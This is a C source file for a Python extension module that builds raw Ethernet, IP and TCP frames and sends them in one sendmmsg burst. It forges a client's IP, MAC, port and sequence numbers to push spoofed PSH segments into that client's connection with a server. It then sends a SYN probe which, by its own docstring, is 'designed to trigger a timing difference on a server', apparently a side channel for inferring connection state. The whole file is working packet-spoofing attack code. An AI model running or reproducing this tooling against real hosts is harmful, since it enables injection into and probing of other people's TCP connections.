#define _GNU_SOURCE

#include <linux/if_ether.h>
#include <netinet/in.h>
#include <asm-generic/socket.h>
#include <bits/types/struct_iovec.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <asm/unistd.h>
#include <python3.9/Python.h>

#ifndef __NR_sendmmsg
#if defined( __PPC__)
#define __NR_sendmmsg 349
#elif defined(__x86_64__)
#define __NR_sendmmsg 307
#elif defined(__i386__)
#define __NR_sendmmsg 345
#else
#error __NR_sendmmsg not defined
#endif
#endif

/*
    Pseudoheader for csum calculation
*/
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

struct ether_options {
    char *smac;
    char *dmac;
};

struct tcp_options {
    char *srcIp;
    char *dstIp;
    int sPort;
    int dPort;
    int b_syn;
    int b_ack;
    int b_psh;
    int b_rst;
    int seq_no;
    int ack_no;
    struct ether_options eOptions;
};

/*
	Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;

    return (answer);
}

static int create_socket(char *interface) {
    //Create a raw socket
    int s = socket(AF_PACKET, SOCK_RAW, 0);

    if (s == -1) {
        //socket creation failed, may be because of non-root privileges
        perror("Socket");
        exit(1);
    }

    const int len = strnlen(interface, IFNAMSIZ);
    if (len == IFNAMSIZ) {
        //setting the interface failed
        fprintf(stderr, "Too long iface name!");
        exit(1);
    }

    setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, interface, len);

    /*if (strcmp(interface, "") == 0) {
        printf("Interface set automatically\n");
    } else {
        printf("Interface set to: %s\n", interface);
    }*/

    return s;
}

void build_tcp (struct tcp_options tcpOptions, char *payload, struct msghdr *message, struct iovec *iov, char *datagram) {
    //Datagram to represent the packet and zero out buffer
    char source_ip[32], *data, *pseudogram;
    memset(datagram, 0, 4096);

    //Eth header
    struct ethhdr *eh = (struct ethhdr *) datagram;

    //IP header
    struct iphdr *iph = (struct iphdr *) (datagram + sizeof(struct ethhdr));


    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ethhdr) + sizeof(struct iphdr));

    struct sockaddr_in sin;
    struct pseudo_header psh;

    //Data part
    data = datagram + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data, (char *) payload);


    int source_mac[6];
    int dest_mac[6];
    sscanf(tcpOptions.eOptions.smac, "%x:%x:%x:%x:%x:%x", &source_mac[0], &source_mac[1], &source_mac[2], &source_mac[3], &source_mac[4],
           &source_mac[5]);
    sscanf(tcpOptions.eOptions.dmac, "%x:%x:%x:%x:%x:%x", &dest_mac[0], &dest_mac[1], &dest_mac[2], &dest_mac[3], &dest_mac[4],
           &dest_mac[5]);

    unsigned char source[6];
    unsigned char dest[6];

    for (int i = 0; i < 6; i++) {
        source[i] = source_mac[i];
        dest[i] = dest_mac[i];
    }

    //Ethernet header
    eh->h_proto = htons(ETH_P_IP);
    eh->h_source[0] = source[0];
    eh->h_source[1] = source[1];
    eh->h_source[2] = source[2];
    eh->h_source[3] = source[3];
    eh->h_source[4] = source[4];
    eh->h_source[5] = source[5];
    eh->h_dest[0] = dest[0];
    eh->h_dest[1] = dest[1];
    eh->h_dest[2] = dest[2];
    eh->h_dest[3] = dest[3];
    eh->h_dest[4] = dest[4];
    eh->h_dest[5] = dest[5];

    //debug info
    /*
    printf("Source MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", eh->h_source[0], eh->h_source[1], eh->h_source[2],
           eh->h_source[3], eh->h_source[4], eh->h_source[5]);
    printf("Destination MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", eh->h_dest[0], eh->h_dest[1], eh->h_dest[2],
           eh->h_dest[3], eh->h_dest[4], eh->h_dest[5]);
           */

    //address resolution
    strcpy(source_ip, (char *) tcpOptions.srcIp);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr((char *) tcpOptions.dstIp);


    //Fill in the IP Header

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
    iph->id = htonl(54321);    //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;        //Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    //Ip checksum
    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

    //debug info
    /*
    printf("IP Header\n");
    printf("   |-IP Version        : %d\n", (unsigned int) iph->version);
    printf("   |-IP Header Length  : %d DWORDS or %d Bytes\n", (unsigned int) iph->ihl,
           ((unsigned int) (iph->ihl)) * 4);
    printf("   |-Type Of Service   : %d\n", (unsigned int) iph->tos);
    printf("   |-IP Total Length   : %d  Bytes(Size of Packet)\n", ntohs(iph->tot_len));
    printf("   |-Identification    : %d\n", ntohs(iph->id));
    printf("   |-TTL      : %d\n", (unsigned int) iph->ttl);
    printf("   |-Protocol : %d\n", (unsigned int) iph->protocol);
    printf("   |-Checksum : %d\n", ntohs(iph->check));
    printf("   |-Source IP        : %u\n", iph->saddr);
    printf("   |-Destination IP   : %u\n", iph->daddr);
    */

    //TCP Header
    tcph->source = htons(tcpOptions.sPort);
    tcph->dest = htons(tcpOptions.dPort);
    tcph->seq = htonl(tcpOptions.seq_no);
    tcph->ack_seq = htonl(tcpOptions.ack_no);
    tcph->doff = 5;    //tcp header size
    tcph->fin = 0;
    tcph->syn = tcpOptions.b_syn;
    tcph->rst = tcpOptions.b_rst;
    tcph->psh = tcpOptions.b_psh;
    tcph->ack = tcpOptions.b_ack;
    tcph->urg = 0;
    tcph->window = htons(5840);    /* maximum allowed window size */
    tcph->check = 0;    //leave checksum 0 now, filled later by pseudo header
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

    //debug
    /*
    printf("TCP Header\n");
    printf("   |-Source Port      : %u\n", ntohs(tcph->source));
    printf("   |-Destination Port : %u\n", ntohs(tcph->dest));
    printf("   |-Sequence Number    : %u\n", ntohl(tcph->seq));
    printf("   |-Acknowledge Number : %u\n", ntohl(tcph->ack_seq));
    printf("   |-Header Length      : %d DWORDS or %d BYTES\n", (unsigned int) tcph->doff,
           (unsigned int) tcph->doff * 4);
    printf("   |-Urgent Flag          : %d\n", (unsigned int) tcph->urg);
    printf("   |-Acknowledgement Flag : %d\n", (unsigned int) tcph->ack);
    printf("   |-Push Flag            : %d\n", (unsigned int) tcph->psh);
    printf("   |-Reset Flag           : %d\n", (unsigned int) tcph->rst);
    printf("   |-Synchronise Flag     : %d\n", (unsigned int) tcph->syn);
    printf("   |-Finish Flag          : %d\n", (unsigned int) tcph->fin);
    printf("   |-Window         : %d\n", ntohs(tcph->window));
    printf("   |-Checksum       : %d\n", ntohs(tcph->check));
    printf("   |-Urgent Pointer : %d\n", tcph->urg_ptr);
    */

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);

    memcpy(pseudogram, (char *) &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));

    tcph->check = csum((unsigned short *) pseudogram, psize);

    iov->iov_base = datagram;     //pointer to data
    iov->iov_len = sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data); //total size (including ETH header!)

    int ret;
    struct addrinfo *ainfo;
    struct addrinfo hints = {
            .ai_family = PF_INET,
            .ai_socktype = SOCK_RAW,
            .ai_protocol = IPPROTO_TCP,
            .ai_flags = AI_PASSIVE,
    };

    //node, service, hints, result
    ret = getaddrinfo(tcpOptions.dstIp, NULL, &hints, &ainfo);
    message->msg_name = ainfo->ai_addr;          //optional address/socket name
    message->msg_namelen = ainfo->ai_addrlen;    //size of address
    message->msg_iov = iov;                      //iovec array
    message->msg_iovlen = 1;                     //elements in array

}

void do_tcp(int sock, char *interface, struct tcp_options sOptions, struct tcp_options pOptions, int length) {
    struct mmsghdr messages[length];
    memset(messages, 0, sizeof(messages));

    //Get interface index
    struct ifreq ifreq_buf = {};
    strncpy(ifreq_buf.ifr_name, interface, IFNAMSIZ);
    ioctl(sock, SIOCGIFINDEX, &ifreq_buf);
    int ifindex = ifreq_buf.ifr_ifindex;

    struct sockaddr_ll if_eth_addr = {};
    if_eth_addr.sll_family = PF_PACKET;
    if_eth_addr.sll_ifindex = ifindex;
    if_eth_addr.sll_halen = ETH_ALEN;
 
    // Create probe

    struct msghdr hdr_probe = {};
    char dgram_probe[4096] = "";
    struct iovec iov_probe = {};
    build_tcp(pOptions, "Probe", &hdr_probe, &iov_probe, (char *) &dgram_probe);
    hdr_probe.msg_name = &if_eth_addr;
    hdr_probe.msg_namelen = sizeof(if_eth_addr);
    messages[length-1].msg_hdr = hdr_probe;

    // Create spoofed segments

    struct msghdr hdrs_spoofed[length];
    char dgrams_spoofed[length][4096];
    struct iovec iovecs_spoofed[length];

    memset(hdrs_spoofed, 0, sizeof(hdrs_spoofed));
    memset(dgrams_spoofed, 0, sizeof(dgrams_spoofed));
    memset(iovecs_spoofed, 0, sizeof(iovecs_spoofed));

    for(int i = 0; i < length-1; i++) {
        char *payload = "Test"; 
        sOptions.seq_no = sOptions.seq_no + 1;
        build_tcp(sOptions, payload, &hdrs_spoofed[i], &iovecs_spoofed[i],(char *) &dgrams_spoofed[i]);
        hdrs_spoofed[i].msg_name = &if_eth_addr;
        hdrs_spoofed[i].msg_namelen = sizeof(if_eth_addr);
        messages[i].msg_hdr = hdrs_spoofed[i];
    }

    // Send everything off

	int retval;
	retval = sendmmsg(sock, messages, length, 0);
	if (retval == -1) {
	    perror("sendmmsg()");
	    exit(1);
	}
}

static PyObject *py_send_segments(PyObject *self, PyObject *args) {

    char *interface = "";

    char *script_ip = "";
    char *client_ip = "";
    char *server_ip = "";

    char *script_mac = "";
    char *client_mac = "";
    char *server_mac = "";

    int seq_no;
    int ack_no;

    int script_port;
    int client_port;
    int server_port;

    if (!PyArg_ParseTuple(args, "sssssssiiiii", &interface, &script_ip, &client_ip, &server_ip, &script_mac, &client_mac, &server_mac, &seq_no, &ack_no, &script_port, &client_port, &server_port)) {
        return NULL;
    }

    int sockfd = create_socket(interface);

    struct tcp_options spoofedOptions = {
        .srcIp = client_ip,
        .dstIp = server_ip, 
        .sPort = client_port,
        .dPort = server_port,
        .b_syn = 0,
        .b_ack = 0,
        .b_psh = 1,
        .b_rst = 0,
        .seq_no = seq_no,
        .ack_no = ack_no,
        .eOptions = {
            .smac = client_mac,
            .dmac = server_mac,
        },
    };

    struct tcp_options probeOptions = {
        .srcIp = script_ip,
        .dstIp = server_ip,
        .sPort = script_port,
        .dPort = server_port,
        .b_syn = 1,
        .b_ack = 0,
        .b_psh = 0,
        .b_rst = 0,
        .seq_no = 0,
        .ack_no = 0,
        .eOptions = {
            .smac = script_mac,
            .dmac = server_mac,
        },
    };

    do_tcp(sockfd, interface, spoofedOptions, probeOptions, 6);

    return PyLong_FromLong(1);
}

static PyMethodDef Methods[] = {
  {"send_segments", py_send_segments, METH_VARARGS, "Function for sending a series of segments"}, 
  {NULL, NULL, 0, NULL}
};

static struct PyModuleDef Sendingmodule = {
  PyModuleDef_HEAD_INIT,
  "Transmission Module",                             
  "C module for sending a series of TCP segments designed to trigger a timing difference on a server.",  
  -1,                                   
  Methods                          
};

/*
    Change "modTransmit" to any name, this will determine the name of the python module
*/
PyMODINIT_FUNC PyInit_modTransmit(void) {
  return PyModule_Create(&Sendingmodule);
};


